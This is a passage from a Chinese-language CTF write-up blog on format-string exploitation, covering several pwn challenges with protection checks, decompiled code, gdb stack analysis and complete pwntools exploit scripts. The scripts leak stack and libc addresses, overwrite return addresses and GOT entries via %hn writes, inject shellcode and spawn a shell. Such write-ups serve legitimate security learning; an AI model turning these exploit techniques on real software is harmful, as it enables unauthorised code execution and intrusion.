<h3 id="exp-6"><a href="#exp-6" class="headerlink" title="exp"></a>exp</h3><pre><code class="python">from pwn import *
import time
context.log_level = &#39;debug&#39;
context.arch = &#39;i386&#39;
io = process(&#39;./ebp&#39;)
# io = remote(&#39;node3.buuoj.cn&#39;,29994)
buf = 0x0804a080 + 0x40 #0x804a0c0
raw_input(&#39;-&gt;&#39;)
io.sendline(&#39;%4$p&#39;)
ret_stack_addr = int(io.recv(10),16) - 28
print(&#39;leak ret_stack_addr:&#39;+hex(ret_stack_addr))
key1 = int(str(hex(ret_stack_addr))[-2:],16)
key2 = 0xa0c0
payload = &#39;%{}c%4$hhn&#39;.format(key1)
raw_input(&#39;-&gt;&#39;)
io.sendline(payload)
io.recv()
payload = &#39;%{}c%12$hn&#39;.format(key2)
payload = payload.ljust(0x40) 
payload +=  asm(shellcraft.sh())
io.sendline(payload)
io.interactive()</code></pre>
<h2 id="hitcontraining-playfmt"><a href="#hitcontraining-playfmt" class="headerlink" title="hitcontraining-playfmt"></a>hitcontraining-playfmt</h2><h3 id="保护和arch-5"><a href="#保护和arch-5" class="headerlink" title="保护和arch"></a>保护和arch</h3><pre><code>[*] &#39;/media/psf/mypwn2/buuctf/hitcontraining_playfmt/playfmt&#39;
    Arch:     i386-32-little
    RELRO:    Partial RELRO
    Stack:    No canary found
    NX:       NX disabled
    PIE:      No PIE (0x8048000)
    RWX:      Has RWX segments</code></pre><p>没有任何保护。</p>
<h3 id="ida分析-6"><a href="#ida分析-6" class="headerlink" title="ida分析"></a>ida分析</h3><pre><code class="c">int do_fmt()
{
  int result; // eax

  while ( 1 )
  {
    read(0, buf, 0xC8u);
    result = strncmp(buf, &quot;quit&quot;, 4u);
    if ( !result )
      break;
    printf(buf);
  }
  return result;
}</code></pre>
<p>上层有play 和 main函数，一共三层，在第三层的这个函数存在格式化字符串漏洞，让我们很方便的用ebp链来做题。然后，有无限次的触发这个漏洞的机会。</p>
<p>攻击思路 ：因为没有开nx保护，也就以为着可以用shellcode进行攻击。然后还是改返回地址，提前在可控的buf合适的地方摆上shellcode，然后跳上去即可。</p>
<h3 id="gdb分析"><a href="#gdb分析" class="headerlink" title="gdb分析"></a>gdb分析</h3><p><img src="http://qiqianyun.chumen77.xyz/uPic/84eq2e.png" srcset="/img/loading.gif" alt></p>
<p>如图所示，利用这个链即可。先想办法把<code>Oxffffd358</code>  改成 <code>Oxffffd33c</code> :</p>
<p><img src="http://qiqianyun.chumen77.xyz/uPic/HEOU3i.png" srcset="/img/loading.gif" alt></p>
<p>然后在想办法把0x8048507 这个返回地址改成我们摆放的shellcode的地址即可。</p>
<h3 id="exp-7"><a href="#exp-7" class="headerlink" title="exp"></a>exp</h3><pre><code class="python">from pwn import *
import time
context.log_level = &#39;debug&#39;
context.arch = &#39;i386&#39;
io = process(&#39;./playfmt&#39;)
# io = remote(&#39;node3.buuoj.cn&#39;,26382)
buf = 0x0804A060 + 0x40 #0x804a0a0
offset1 = 6
offset2 = 10
info(&#39;---leak stack address---&#39;)
io.recvuntil(&#39;\n=====================\n&#39;)
io.sendline(&#39;%10$p&#39;)
ret_stack_addr = int(io.recv(10),16) - 28
print(&#39;leak ret_stack_addr:&#39;+hex(ret_stack_addr))
info(&#39;---change the retaddr---&#39;)
key = int(str(hex(ret_stack_addr))[-2:],16)
payload = &quot;%{}c%6$hhn&quot;.format(key)
raw_input(&#39;-&gt;&#39;)
io.sendline(payload)
sleep(0.1)
io.recv()
key2 = 0xa0a0
payload = &quot;%{}c%10$hn&quot;.format(key2)
payload = payload.ljust(0x40)
payload += asm(shellcraft.sh())
raw_input(&#39;-&gt;&#39;)
io.sendline(payload)
io.recv()
sleep(0.1)
io.sendline(&#39;quit&#39;)
io.interactive()</code></pre>
<p>记得发出去一次payload，一定需要接受一次，再去发第二个payload，防止没有完成一个printf，就让程序接受发送的东西，这样容易崩溃。</p>
<h2 id="pwnable-fsb"><a href="#pwnable-fsb" class="headerlink" title="pwnable-fsb"></a>pwnable-fsb</h2><h3 id="arch和保护"><a href="#arch和保护" class="headerlink" title="arch和保护"></a>arch和保护</h3><pre><code>    Arch:     i386-32-little
    RELRO:    Partial RELRO
    Stack:    No canary found
    NX:       NX enabled
    PIE:      No PIE (0x8048000)</code></pre><p>开了nx了。</p>
<h3 id="ida分析-7"><a href="#ida分析-7" class="headerlink" title="ida分析"></a>ida分析</h3><pre><code class="c"> for ( k = 0; k &lt;= 3; ++k )
  {
    printf(&quot;Give me some format strings(%d)\n&quot;, k + 1);
    read(0, buf, 0x64u);
    printf(buf);
  }
  puts(&quot;Wait a sec...&quot;);
  sleep(3u);</code></pre>
<p>可以看到这里控制了可以利用printf函数漏洞的次数，只可以利用4次。</p>
<pre><code class="c">  execve(path, &amp;path, 0);</code></pre>
<p>且这一条可以给你拿到shell。</p>
<p>那攻击思路就可以是改掉puts，sleep的got表，到这个拿取shell的位置就行。<br>因为这里下面就调用一次sleep，就改它好了，基本不会出问题。</p>
<p><img src="http://qiqianyun.chumen77.xyz/uPic/b41nYE.png" srcset="/img/loading.gif" alt><br>注意一下这里的汇编代码，其也是让栈的esp处于不定的状态。</p>
<h3 id="gdb分析-1"><a href="#gdb分析-1" class="headerlink" title="gdb分析"></a>gdb分析</h3><p>此时的EBP = 0xffffd228 </p>
<pre><code>0000| 0xffffd1e0 --&gt; 0x804a100 (&quot;AAAA\n&quot;)
0004| 0xffffd1e4 --&gt; 0x804a100 (&quot;AAAA\n&quot;)
0008| 0xffffd1e8 --&gt; 0x64 (&#39;d&#39;)
0012| 0xffffd1ec --&gt; 0xf7f5b2a2 (&quot;__vdso_clock_gettime&quot;)
0016| 0xffffd1f0 --&gt; 0xf7fe1fc9 (&lt;do_lookup_x+9&gt;:    add    ebx,0x1b037)
0020| 0xffffd1f4 --&gt; 0x0
0024| 0xffffd1f8 --&gt; 0xf7ffdad0 --&gt; 0xf7ffda74 --&gt; 0xf7fd3470 --&gt; 0xf7ffd918 --&gt; 0x0
0028| 0xffffd1fc --&gt; 0xffffd278 --&gt; 0xf7e0b018 --&gt; 0x3eab
0032| 0xffffd200 --&gt; 0xffffd2c0 --&gt; 0x804a024 --&gt; 0xf7ed6290 (&lt;close&gt;:    cmp    DWORD PTR gs:0xc,0x0)
0036| 0xffffd204 --&gt; 0x8048870 (&quot;/bin/sh&quot;)
0040| 0xffffd208 --&gt; 0x0
0044| 0xffffd20c --&gt; 0x0
0048| 0xffffd210 --&gt; 0xffffd4a4 --&gt; 0x0
0052| 0xffffd214 --&gt; 0xffffdfce --&gt; 0x656d2f00 (&#39;&#39;)
0056| 0xffffd218 --&gt; 0xffffd230 --&gt; 0x0
0060| 0xffffd21c --&gt; 0xffffd234 --&gt; 0x0
0064| 0xffffd220 --&gt; 0x0
0068| 0xffffd224 --&gt; 0x1
0072| 0xffffd228 --&gt; 0xffffd378 --&gt; 0x0
</code></pre><p>可以看到，因为这个题是main -&gt; fsb ,用户代码只有2层函数的调用，看这个ebp chain的时候就有点不方便了，我们没有一个完整的chain来使用。这个时候，就只能把ebp3 的值，自己写上去，写上sleep的got然后再改成拿shell的地址就行了。<br><img src="http://qiqianyun.chumen77.xyz/uPic/Bb3DnD.png" srcset="/img/loading.gif" alt><br><strong>整个过程还是需要泄漏一下栈地址esp，因为其栈是变化的。泄露以后，也获取一下ebp2的值，然后（ebp2- esp ）/4 也就确定到了，main的ebp值（ebp3）对应格式化字符串的偏移值。</strong>然后再次利用printf函数根据这个偏移来进行改写sleep got上的值。</p>
<h3 id="exp-8"><a href="#exp-8" class="headerlink" title="exp"></a>exp</h3><pre><code class="python">from pwn import *
import time
context.log_level = &#39;debug&#39;
context.arch = &#39;i386&#39;
io = process(&#39;./fsb&#39;)
# s = ssh(
#     host=&quot;pwnable.kr&quot;,
#     port=2222,
#     user=&quot;fsb&quot;,
#     password=&quot;guest&quot;
# )
# io = s.run(&quot;/home/fsb/fsb&quot;)
# io = shell.run(&quot;/home/fsb/fsb&quot;)
sleep_got = 0x0804a008
info(&#39;--------leak stack base:-------&#39;)
io.recvuntil(&#39;strings(1)\n&#39;)
io.sendline(&#39;%14$p&#39;)
io.recvuntil(&#39;0x&#39;)
stack_base = int(io.recv(8),16) - 80
print(hex(stack_base))
info(&#39;--------leak the point to main ebp:-------&#39;)
io.recvuntil(&#39;strings(2)\n&#39;)
io.sendline(&#39;%18$p&#39;)
io.recvuntil(&#39;0x&#39;)
point = int(io.recv(8),16)
print(hex(point))
info(&#39;--------write sleep_got to main_ebp :-------&#39;)
io.recvuntil(&#39;strings(3)\n&#39;)
key1 = 0x0804A008
payload = &#39;%&#39; + str(key1) + &#39;c%18$n&#39;
io.sendline(payload)
info(&#39;--------write tag to sleep_got :-------&#39;)
tag = 0x869F
offset = (point - stack_base) / 4
payload = &quot;%{}c%&#39;str(offset)&#39;$hn &quot;.format(tag)
io.recvuntil(&#39;strings(4)\n&#39;)
io.sendline(payload)
io.interactive()</code></pre>
<h2 id="inndy-echo3"><a href="#inndy-echo3" class="headerlink" title="inndy-echo3"></a>inndy-echo3</h2><h3 id="保护和arch-6"><a href="#保护和arch-6" class="headerlink" title="保护和arch"></a>保护和arch</h3><pre><code>    Arch:     i386-32-little
    RELRO:    Partial RELRO
    Stack:    Canary found
    NX:       NX enabled
    PIE:      No PIE (0x8048000)</code></pre><h3 id="ida分析-8"><a href="#ida分析-8" class="headerlink" title="ida分析"></a>ida分析</h3><p><img src="http://qiqianyun.chumen77.xyz/uPic/Z7hCmN.png" srcset="/img/loading.gif" alt><br><img src="http://qiqianyun.chumen77.xyz/uPic/OawGHm.png" srcset="/img/loading.gif" alt><br>这一处会让栈的情况变得无法预测。然后进入hardfmt：</p>
<pre><code class="c">  for ( i = 0; i &lt;= 4; ++i )
  {
    read(0, buff, 0x1000u);
    printf(buff);
  }</code></pre>
<p>这一处存在漏洞，且往下看感觉没什么好利用的，没什么漏洞函数。那攻击思路就是：改printf的got表，然后在第5次传过去<code>/bin/sh</code>即可。<br>（这个题目思路还是很简单的，但是因为这个次数的限制，在实际操作过程中，要充分的利用每一次格式化字符串漏洞。）</p>
<h3 id="gdb分析-2"><a href="#gdb分析-2" class="headerlink" title="gdb分析"></a>gdb分析</h3><p>因为栈情况不一样，可以选择最适合我们利用漏洞的栈空间，这样做起来会简单一些。</p>
<p>我自己选择在偏移在43的时候开始进行分析，想办法来利用这个漏洞：<br><img src="http://qiqianyun.chumen77.xyz/uPic/8gciU0.png" srcset="/img/loading.gif" alt></p>
<p>仔细看下此时的栈情况 ，然后再次分析下我们的目标 ：</p>
<ul>
<li>泄漏libc基址，计算出system的内存地址。</li>
<li>在栈上构造出printf的got地址和printf的got地址+2的地址（0x0804a014和0x0804a016）</li>
<li>在构造的got地址上，开始写system地址</li>
</ul>
<p>由于这个漏洞可以的用的次数最多是4次，所以要尽可能利用每一次。<br>如上图所示，很简单就可以泄漏出libc基址。<br>但是接下来怎么构造printf的got地址和printf的got地址+2的地址就有点难了。</p>
<p>此时注意图上前两个框框，可以发现把第二个框框的两个地址修改为 第一个框框的栈指针：</p>
<pre><code>gdb-peda$ set *0xffbe5e6c = 0xffbe5d54
gdb-peda$ set *0xffbe5e64 = 0xffbe5d60</code></pre><p><img src="http://qiqianyun.chumen77.xyz/uPic/KIrnCk.png" srcset="/img/loading.gif" alt><br>这个过程在泄漏目标栈地址以后，也是可以通过一次printf函数写入2次地址，实现这个栈情况的。</p>
<p>接着就可以构造got地址：</p>
<pre><code>gdb-peda$ set *0xffbe5d60  = 0x0804a016
gdb-peda$ set *0xffbe5d54  = 0x0804a014</code></pre><p><img src="http://qiqianyun.chumen77.xyz/uPic/hma5RY.png" srcset="/img/loading.gif" alt></p>
<p>然后就可以写system的内存地址上got了：</p>
<pre><code>0120| 0xffbe5d88 --&gt; 0xffbe5e6c --&gt; 0xffbe5d54 --&gt; 0x804a014 --&gt; 0xf7e0cda0 (&lt;__libc_system&gt;:    sub    esp,0xc)</code></pre><p>这样再传过去一下<code>/bin/sh</code>即可。</p>
<h3 id="exp-9"><a href="#exp-9" class="headerlink" title="exp"></a>exp</h3><pre><code class="python">from pwn import *
context.log_level = &#39;debug&#39;
context.arch =&#39;i386&#39;
import time
elf = ELF(&#39;./echo3&#39;)
debug = 1
while True:
    if debug :
        io = process(&#39;./echo3&#39;)
        libc = elf.libc
    else:
        io = remote(&#39;node3.buuoj.cn&#39;,25057)
        libc = ELF(&#39;./libc-2.23.so.i386&#39;)
    payload = &#39;%43$pA%30$pA%47$p&#39;
    io.sendline(payload)
    address = io.recvline().strip()
    if address[-3:] == &#39;637&#39;:
        if address[7:10] == &#39;637&#39;:
            libc_base = int(address[2:10],16) - 247 - libc.symbols[&#39;__libc_start_main&#39;]
            tag1_stack_point = int(address[13:21],16) - 0x118
            tag2_stack_point = int(address[13:21],16) - 0x104 - 0x8
            system_addr = libc_base + libc.symbols[&#39;system&#39;]
            print(&#39;system_addr  -&gt;&#39; + hex(system_addr))
            print(&#39;tag1_stack_point -&gt;&#39; + hex(tag1_stack_point))
            print(&#39;tag2_stack_point -&gt;&#39; + hex(tag2_stack_point))
            break
    else :
        io.close()
        continue
# io = 
def fmtshort(prev,val,idx,byte = 2):
    result = &quot;&quot;
    if prev &lt; val :
        result += &quot;%&quot; + str(val - prev) + &quot;c&quot;
    elif prev == val :
        result += &#39;&#39;
    else :
        result += &quot;%&quot; + str(256**byte - prev + val) + &quot;c&quot;
    result += &quot;%&quot; + str(idx) + &quot;$hn&quot;
    return result
def fmtbyte(prev,val,idx,byte = 1):
    result = &quot;&quot;
    if prev &lt; val :
        result += &quot;%&quot; + str(val - prev) + &quot;c&quot;
    elif prev == val :
        result += &#39;&#39;
    else :
        result += &quot;%&quot; + str(256**byte - prev + val) + &quot;c&quot;
    result += &quot;%&quot; + str(idx) + &quot;$hhn&quot;
    return result
printf_got = 0x0804a014
key1 = int(hex(tag1_stack_point)[-4:],16)
key2 = int(hex(tag2_stack_point)[-4:],16)
info(&#39;--------change the two points to tag_stack_point:-------&#39;)
# raw_input(&#39;-&gt;&#39;)
prev = 0
payload = &quot;&quot;
for i in range(1):
    payload +=fmtshort(prev,(key1 &gt;&gt; 16*i) &amp; 0xffff,30+i) 
    prev = (key1 &gt;&gt; i*16) &amp; 0xffff
for i in range(1):
    payload +=fmtshort(prev,(key2 &gt;&gt; 16*i) &amp; 0xffff,31+i) 
    prev = (key2 &gt;&gt; i*16) &amp; 0xffff
payload = payload + &#39;1111&#39;
raw_input(&#39;-&gt;&#39;)
io.sendline(payload)
io.recvuntil(&#39;1111&#39;)
info(&#39;--------change got_table to printf_got:-------&#39;)
raw_input(&#39;-&gt;&#39;)
prev = 0 
payload = &quot;&quot;
key3 = 0x14
key4 = 0x16
for i in range(1):
    payload +=fmtbyte(prev,(key3 &gt;&gt; 8*i) &amp; 0xff,87+i) 
    prev = (key3 &gt;&gt; i*8) &amp; 0xff
for i in range(1):
    payload +=fmtbyte(prev,(key4 &gt;&gt; 8*i) &amp; 0xff,85+i) 
    prev = (key4 &gt;&gt; i*8) &amp; 0xff
payload = payload + &#39;2222&#39;
io.sendline(payload)
io.recvuntil(&#39;2222&#39;)
info(&#39;--------change printf_got to system_addr:-------&#39;)
raw_input(&#39;-&gt;&#39;)
prev = 0 
payload = &quot;&quot;
key5 = int(hex(system_addr)[-4:],16)
key6 = int(hex(system_addr)[2:6],16)
print(&#39;key5 -&gt; &#39; + hex(key5))
print(&#39;key6 -&gt; &#39; + hex(key6))
for i in range(1):
    payload +=fmtshort(prev,(key5 &gt;&gt; 16*i) &amp; 0xffff,17+i) 
    prev = (key5 &gt;&gt; i*16) &amp; 0xffff
for i in range(1):
    payload +=fmtshort(prev,(key6 &gt;&gt; 16*i) &amp; 0xffff,20+i) 
    prev = (key6 &gt;&gt; i*16) &amp; 0xffff
payload = payload + &#39;3333&#39;
io.sendline(payload)
sleep(1)
io.recvuntil(&#39;3333&#39;)
raw_input(&#39;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&#39;)
io.sendline(&#39;/bin/sh\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00&#39;)
io.interactive()</code></pre>
<p>这个exp的难点在于：</p>
<ul>
<li>注意去定位到合适的栈结构再去利用</li>
<li>尽量充分利用每一次的printf</li>
<li>单次printf多次写入</li>
<li>注意每次传数据过去后，一定要接收一下，并且再一次的数据读入要防止bss上的缓冲区里面参杂数据的影响。<h3 id="结论和收获"><a href="#结论和收获" class="headerlink" title="结论和收获"></a>结论和收获</h3></li>
</ul>
<p>这个题教会我一定要<strong>灵活、充分的利用栈上的数据</strong>,单纯的ebp链只是适合简单的情况。还有就是面对这种会有随机栈情况的题目，尽量要注意本地和远程的ibc版本、注意环境,这些不一样导致栈的情况也是不一样的，导致exp也要有相应的变化。</p>
<h2 id="xman-2019-format"><a href="#xman-2019-format" class="headerlink" title="xman-2019-format"></a>xman-2019-format</h2><h3 id="保护和arch-7"><a href="#保护和arch-7" class="headerlink" title="保护和arch"></a>保护和arch</h3><pre><code>CANARY    : disabled
FORTIFY   : disabled
NX        : ENABLED
PIE       : disabled
RELRO     : Partial</code></pre><h3 id="ida分析-9"><a href="#ida分析-9" class="headerlink" title="ida分析"></a>ida分析</h3><pre><code class="c">char *__cdecl sub_80485C4(char *s)
{
  char *v1; // eax
  char *result; // eax

  puts(&quot;...&quot;);
  v1 = strtok(s, &quot;|&quot;);
  printf(v1);
  while ( 1 )
  {
    result = strtok(0, &quot;|&quot;);
    if ( !result )
      break;
    printf(result);
  }
  return result;
}</code></pre>
<p>这里因为用strtok做处理，只有一次的传送机会，payload需要用<code>|</code>    分割格式化字符串来完成每次的printf的漏洞利用，稍微麻烦了一下。<br>并且存在后门函数：</p>
<pre><code>.text:080485AB                 push    ebp
.text:080485AC                 mov     ebp, esp
.text:080485AE                 sub     esp, 8
.text:080485B1 ; 3:   return system(&quot;/bin/sh&quot;);
.text:080485B1                 sub     esp, 0Ch
.text:080485B4                 push    offset command  ; &quot;/bin/sh&quot;
.text:080485B9                 call    _system
.text:080485BE                 add     esp, 10h
.text:080485C1                 nop
.text:080485C2                 leave
.text:080485C3                 retn</code></pre><p>这下可以直接改ret address即可。</p>
<h3 id="gdb分析-3"><a href="#gdb分析-3" class="headerlink" title="gdb分析"></a>gdb分析</h3><p>先观察一下ebp链是否存在 ：<br><img src="http://qiqianyun.chumen77.xyz/uPic/8H01Yk.png" srcset="/img/loading.gif" alt><br>是存在的，然后直接利用就好了。<br><img src="http://qiqianyun.chumen77.xyz/uPic/e2PTss.png" srcset="/img/loading.gif" alt><br>看一下，在第一次改ebp2里面的值： 0xffffd338 时，发现下面的第二个只需要改一个字节即可，然后目标就是改成这个栈地址了：<br><img src="http://qiqianyun.chumen77.xyz/uPic/cYhR45.png" srcset="/img/loading.gif" alt><br>然后接着利用漏洞，改一下返回地址到后门函数即可。</p>
<p>（这个题自己在做的时候，先是试着利用第二个的0xffffd2f8 ，这个链发现本地可以打通，远程是不行的，这就是环境因素了，远程由于libc版本的不同，栈结构也是不同的。所以做题还是优先，考虑ebp链，然后没法利用了，在考虑充分利用栈数据，这个通常也是出题人精心设计的栈结构，让你有数据可以利用。）</p>
<h3 id="exp-10"><a href="#exp-10" class="headerlink" title="exp"></a>exp</h3><pre><code class="python">from pwn import *
context.log_level = &#39;debug&#39;
context.arch = &#39;i386&#39;
system_addr = 0x080485B4
tag1 = 0x4c
tag2 = 0x85ab
io = process(&#39;./xman_2019_format&#39;)
# io = remote(&#39;node3.buuoj.cn&#39;,27012)
payload = &#39;%{}c%10$hhn|&#39;.format(0x4c)
payload += &#39;%{}c%18$hn~&#39;.format(0x85ab)
while True:
    try:
        io.recvuntil(&#39;...\n...\n&#39;)
        io.sendline(payload)
        sleep(0.1)
        io.recvuntil(&#39;~&#39;)
        io.sendline(&#39;ls&#39;)
        io.recvline()
        io.recvline()
        io.interactive()
        break
    except EOFError :
        io.close()
        io = process(&#39;./xman_2019_format&#39;)
        # io = remote(&#39;node3.buuoj.cn&#39;,27012)</code></pre>
<p>需要爆破栈。</p>
<h2 id="suctf-2019-playfmt"><a href="#suctf-2019-playfmt" class="headerlink" title="suctf-2019-playfmt"></a>suctf-2019-playfmt</h2><h3 id="保护和arch-8"><a href="#保护和arch-8" class="headerlink" title="保护和arch"></a>保护和arch</h3><pre><code>    Arch:     i386-32-little
    RELRO:    Full RELRO
    Stack:    No canary found
    NX:       NX enabled
    PIE:      No PIE (0x8048000)</code></pre><p>开启了RELRO，这样就无法got hijack了</p>
<h3 id="ida分析-10"><a href="#ida分析-10" class="headerlink" title="ida分析"></a>ida分析</h3><p><img src="http://qiqianyun.chumen77.xyz/uPic/ycZIc7.png" srcset="/img/loading.gif" alt></p>
<h3 id="gdb分析-4"><a href="#gdb分析-4" class="headerlink" title="gdb分析"></a>gdb分析</h3><p>程序先读入了flag文件，自己可以写一个flag文件测试，并且gdb跟随：<br><img src="http://qiqianyun.chumen77.xyz/uPic/TqMvc5.png" srcset="/img/loading.gif" alt><br>其会被读到堆上。紧接着跟到格式化字符串漏洞处：<br><img src="http://qiqianyun.chumen77.xyz/uPic/DqFQFq.png" srcset="/img/loading.gif" alt><br>看一下这个堆地址是否被程序操作修改了：</p>
<pre><code>gdb-peda$ x/s 0x8050b70
0x8050b70:    &quot;flag{f9255a80-e059-4c12-8788-161bf8c6908b}&quot;</code></pre><p>发现并没有，那就很简单了。攻击思路就是，在栈上构造出这个存放flag的堆地址（计算方式就是在此时的栈上找一个地址来计算偏移获取）。<br>第一步：<br><img src="http://qiqianyun.chumen77.xyz/uPic/kOCpje.png" srcset="/img/loading.gif" alt><br>先修改ebp2上存放的值，改成后面那个框框对应的栈地址，然后在做处理：</p>
<pre><code>0024| 0xffffd318 --&gt; 0xffffd338 --&gt; 0xffffd348 --&gt; 0x8050ba0 --&gt; 0x0</code></pre><p>此时再修改ebp1上的值，改成刚刚的堆地址 ：</p>
<p><img src="http://qiqianyun.chumen77.xyz/uPic/0sJJGL.png" srcset="/img/loading.gif" alt><br>这样exp写的时候，找好偏移%s一下就出来了。</p>
<h3 id="exp-11"><a href="#exp-11" class="headerlink" title="exp"></a>exp</h3><pre><code class="python">from pwn import *
context.log_level = &#39;debug&#39;
context.arch = &#39;i386&#39;
# io = remote(&#39;node3.buuoj.cn&#39;,27816)
io = process(&#39;./1&#39;)
io.recvuntil(&#39;Magic echo Server&#39;)
io.recvuntil(&#39;=====================\n&#39;)
io.sendline(&#39;%18$p&#39;)
io.recvuntil(&#39;0x&#39;)
flag = int(io.recv(8),16)
print(hex(flag))
key = int((hex(flag))[-4:],16) - 32 -12 -4
print(&#39;key&#39;+ hex(key))
# raw_input(&#39;-&gt;&#39;)
io.sendline(&#39;%6$p&#39;)
io.recvuntil(&#39;0x&#39;)
stack_point = int(io.recv(8),16) + 16
tag1 = int((hex(stack_point))[-2:],16)
print(hex(tag1))
payload  = &#39;%&#39; + str(tag1) + &#39;c%6$hhn&#39; + &#39;1&#39;
raw_input(&#39;-&gt;&#39;)
io.sendline(payload)
io.recvuntil(&#39;1&#39;)
payload = &#39;%&#39; +  str(key &amp; 0xffff) + &#39;c%14$hn&#39; + &#39;2&#39;
raw_input(&#39;-&gt;&#39;)
io.sendline(payload)
io.recvuntil(&#39;2&#39;)
io.sendline(&#39;%18$s&#39;)
io.interactive()</code></pre>

            <hr>
          </div>
          <br>
          <div>
            <p>
            
            
              <span>
                <i class="iconfont icon-tag"></i>
                
                  <a class="hover-with-bg" href="/tags/pwn">pwn</a>
                
                  <a class="hover-with-bg" href="/tags/%E5%AD%A6%E4%B9%A0%E8%AE%B0%E5%BD%95">学习记录</a>
                
              </span>
            
            </p>
            
              <p class="note note-warning">本博客所有文章除特别声明外，均采用 <a href="https://zh.wikipedia.org/wiki/Wikipedia:CC_BY-SA_3.0%E5%8D%8F%E8%AE%AE%E6%96%87%E6%9C%AC" rel="nofollow noopener">CC BY-SA 3.0协议</a> 。转载请注明出处！</p>
            
          </div>
        </div>
      </div>
    </div>
    <div class="d-none d-lg-block col-lg-2 toc-container">
      
  <div id="toc">
    <p class="h4"><i class="far fa-list-alt"></i>&nbsp;目录</p>
    <div id="tocbot"></div>
  </div>

    </div>
  </div>
</div>

<!-- custom -->


<!-- Comments -->
<div class="col-lg-7 mx-auto nopadding-md">
  <div class="container comments mx-auto" id="comments">
    
  </div>
</div>

    
  </main>

  
    <a class="z-depth-1" id="scroll-top-button" href="#" role="button">
      <i class="fa fa-chevron-up scroll-top-arrow" aria-hidden="true"></i>
    </a>
  

  
    <div class="modal fade" id="modalSearch" tabindex="-1" role="dialog" aria-labelledby="ModalLabel"
     aria-hidden="true">
  <div class="modal-dialog modal-dialog-scrollable modal-lg" role="document">
    <div class="modal-content">
      <div class="modal-header text-center">
        <h4 class="modal-title w-100 font-weight-bold">搜索</h4>
        <button type="button" id="local-search-close" class="close" data-dismiss="modal" aria-label="Close">
          <span aria-hidden="true">&times;</span>
        </button>
      </div>
      <div class="modal-body mx-3">
        <div class="md-form mb-5">
          <input type="text" id="local-search-input" class="form-control validate">
          <label data-error="x" data-success="v"
                 for="local-search-input">关键词</label>
        </div>
        <div class="list-group" id="local-search-result"></div>
      </div>
    </div>
  </div>
</div>
  

  <footer class="mt-5">
  <div class="text-center py-3">
    <a href="https://hexo.io" target="_blank" rel="nofollow noopener"><b>Hexo</b></a>
    <i class="iconfont icon-love"></i>
    <a href="https://github.com/fluid-dev/hexo-theme-fluid" target="_blank" rel="nofollow noopener"> <b>Fluid</b></a>
    <br>

    
  
    <!-- 不蒜子统计PV -->
    
    &nbsp;<span id="busuanzi_container_site_pv"></span>总访问量 
          <span id="busuanzi_value_site_pv"></span> 次&nbsp;
  
  
    <!-- 不蒜子统计UV -->
    
    &nbsp;<span id="busuanzi_container_site_uv"></span>总访客数 
            <span id="busuanzi_value_site_uv"></span> 人&nbsp;
  
  <br>



    


    <!-- cnzz Analytics icon -->
    

  </div>
</footer>

<!-- SCRIPTS -->
<script src="/lib/jquery/jquery.min.js" ></script>
<script src="/lib/popper/popper.min.js" ></script>
<script src="/lib/bootstrap/js/bootstrap.min.js" ></script>
<script src="/lib/mdbootstrap/js/mdb.min.js" ></script>
<script src="/js/main.js" ></script>


  <script src="/js/lazyload.js" ></script>



  
    <script src="/lib/tocbot/tocbot.min.js" ></script>
  
  <script src="/js/post.js" ></script>



  <script src="/lib/smoothscroll/SmoothScroll.min.js" ></script>



  <script async src="//busuanzi.ibruce.info/busuanzi/2.3/busuanzi.pure.mini.js" ></script>


<!-- Plugins -->


  

  

  

  

  <!-- cnzz Analytics -->
  



  <script src="/lib/prettify/prettify.min.js" ></script>
  <script>
    $(document).ready(function () {
      $('pre').addClass('prettyprint  linenums');
      prettyPrint();
    })
  </script>



  <script src="/lib/typed/typed.min.js" ></script>
  <script>
    var typed = new Typed('#subtitle', {
      strings: [
        '  ',
        "格式化字符串漏洞题目练习&nbsp;",
      ],
      cursorChar: "_",
      typeSpeed: 70,
      loop: false,
    });
    typed.stop();
    $(document).ready(function () {
      $(".typed-cursor").addClass("h2");
      typed.start();
    });
  </script>



  <script src="/lib/anchor/anchor.min.js" ></script>
  <script>
    anchors.options = {
      placement: "right",
      visible: "false",
      
    };
    var el = "h1,h2,h3,h4,h5,h6".split(",");
    var res = [];
    for (item of el) {
      res.push(".markdown-body > " + item)
    }
    anchors.add(res.join(", "))
  </script>



  <script src="/js/local-search.js" ></script>
  <script>
    var path = "/local-search.xml";
    var inputArea = document.querySelector("#local-search-input");
    inputArea.onclick = function () {
      getSearchFile(path);
      this.onclick = null
    }
  </script>



  <script src="/lib/fancybox/jquery.fancybox.min.js" ></script>
  <script>
    $("#post img:not(.no-zoom img, img[no-zoom])").each(
      function () {
        var element = document.createElement("a");
        $(element).attr("data-fancybox", "images");
        $(element).attr("href", $(this).attr("src"));
        $(this).wrap(element);
      }
    );
  </script>





  
  
    <script type="text/javascript">
      //定义获取词语下标
      var a_idx = 0;
      jQuery(document).ready(function ($) {
        //点击body时触发事件
        $("body").click(function (e) {
          //需要显示的词语
          var a = new Array("富强", "民主", "文明", "和谐", "自由", "平等", "公正", "法治", "爱国", "敬业", "诚信", "友善");
          //设置词语给span标签
          var $i = $("<span/>").text(a[a_idx]);
          //下标等于原来下标+1  余 词语总数
          a_idx = (a_idx + 1) % a.length;
          //获取鼠标指针的位置，分别相对于文档的左和右边缘。
          //获取x和y的指针坐标
          var x = e.pageX, y = e.pageY;
          //在鼠标的指针的位置给$i定义的span标签添加css样式
          $i.css({
            "z-index": 999,
            "top": y - 20,
            "left": x,
            "position": "absolute",
            "font-weight": "bold",
            "color": rand_color()
          });
          // 随机颜色
          function rand_color() {
            return "rgb(" + ~~(255 * Math.random()) + "," + ~~(255 * Math.random()) + "," + ~~(255 * Math.random()) + ")"
          }
          //在body添加这个标签
          $("body").append($i);
          //animate() 方法执行 CSS 属性集的自定义动画。
          //该方法通过CSS样式将元素从一个状态改变为另一个状态。CSS属性值是逐渐改变的，这样就可以创建动画效果。
          //详情请看http://www.w3school.com.cn/jquery/effect_animate.asp
          $i.animate({
            //将原来的位置向上移动180
            "top": y - 180,
            "opacity": 0
            //1500动画的速度
          }, 1500, function () {
            //时间到了自动删除
            $i.remove();
          });
        });
      })
      ;
    </script>
  








</body>
</html>
